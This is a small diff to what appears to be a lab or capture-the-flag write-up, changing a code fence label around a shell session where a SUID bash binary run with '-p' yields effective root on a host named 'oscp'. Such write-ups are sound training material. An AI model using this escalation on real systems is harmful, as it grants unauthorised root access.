@@ -468,7 +468,7 @@ strings Not Found
 ````````
 we can take advantage of this binary and become root.
 
-````````bash
+````````python
 (remote) oscp@oscp:/home/oscp$ /usr/bin/bash -p
 (remote) root@oscp:/home/oscp# id
 uid=1000(oscp) gid=1000(oscp) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)
